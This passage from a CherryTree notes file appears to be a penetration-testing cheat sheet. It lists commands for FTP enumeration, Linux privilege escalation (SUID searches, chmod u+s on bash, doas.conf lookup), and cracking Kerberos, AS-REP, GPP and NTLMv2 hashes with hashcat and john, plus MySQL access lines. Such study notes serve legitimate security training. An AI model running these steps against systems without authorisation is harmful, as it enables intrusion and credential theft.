        <codebox char_offset="7" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> nmap -Pn -n -vvv -p21 -sC -sV 192.168.208.53</codebox>
        <codebox char_offset="35" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">wget -r 'ftp://&lt;username&gt;:&lt;password&gt;@192.168.208.53'</codebox>
        <codebox char_offset="52" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ftp -A 192.168.208.53</codebox>
      </node>
      <node name="PrivEsc" unique_id="42" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689966" ts_lastsave="1687689975">
        <node name="Linux" unique_id="43" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689975" ts_lastsave="1687689978">
          <rich_text>• use pspy64
• use linpeas
• check sudo -l
• check SUID with the following

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">
</rich_text>
          <rich_text>
PS: A binary can be changed to </rich_text>
          <rich_text family="monospace">SUID</rich_text>
          <rich_text> by using </rich_text>
          <rich_text family="monospace">chmod u+s /bin/bash</rich_text>
          <rich_text>

• check do as via:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">
</rich_text>
          <rich_text>

References:
◇ </rich_text>
          <rich_text link="webs https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/">https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/</rich_text>
          <rich_text>
◇ </rich_text>
          <rich_text link="webs https://book.hacktricks.xyz/linux-hardening/privilege-escalation">https://book.hacktricks.xyz/linux-hardening/privilege-escalation</rich_text>
          <rich_text>

  </rich_text>
          <codebox char_offset="76" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">find / -perm -u=s -type f 2&gt;/dev/null
or 
find / -perm -4000 2&gt;/dev/null</codebox>
          <codebox char_offset="165" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">find / -type f -name doas.conf 2&gt;/dev/null</codebox>
        </node>
      </node>
      <node name="Password-Cracking" unique_id="46" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690527" ts_lastsave="1687691201">
        <rich_text scale="h3">Cracking</rich_text>
        <rich_text> AD Hashes from ASRepRoasting

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
____________________________________________


</rich_text>
        <rich_text scale="h3">Cracking TGTs</rich_text>
        <rich_text>


</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
____________________________________________

</rich_text>
        <rich_text scale="h3">Cracking cpassword from old computers with GPP group policy</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


___________________________-


</rich_text>
        <rich_text scale="h2">for NTLMv2 hashes</rich_text>
        <rich_text>



</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
</rich_text>
        <codebox char_offset="39" justification="left" frame_width="1090" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">john --wordlist=passwords_kerb.txt hashes.asreproast

hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 

oro1

hashcat -m 18200 unhashedgetNPUsers.log passwordlist.txt</codebox>
        <codebox char_offset="104" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hashcat -m 13100 hashTGT.log /opt/wordlist/rockyou.txt</codebox>
        <codebox char_offset="213" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gpp-decrypt eHHHHyourReallyLongHash</codebox>
        <codebox char_offset="269" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hashcat -a 0 -m 5600 hashes.ntlmv2 /usr/share/wordlists/rockyou.txt -o cracked.txts</codebox>
      </node>
      <node name="Vulnerabilities" unique_id="47" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690556" ts_lastsave="1687690564">
        <node name="SQLInjection" unique_id="48" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690564" ts_lastsave="1687690570">
          <rich_text link="webs https://github.com/nigamelastic/Writeups/blob/master/BsidesCTF/2022/Web.md">https://github.com/nigamelastic/Writeups/blob/master/BsidesCTF/2022/Web.md</rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h3">connecting to sql</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

This prompts me to log into MySQL. I use the password given, then type:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

For help check


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
</rich_text>
          <codebox char_offset="95" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">mysql -u dbuser -p password</codebox>
          <codebox char_offset="171" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">use drupaldb;</codebox>
          <codebox char_offset="191" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">mysql --help</codebox>
        </node>
      </node>
    </node>
  </node>
</cherrytree>
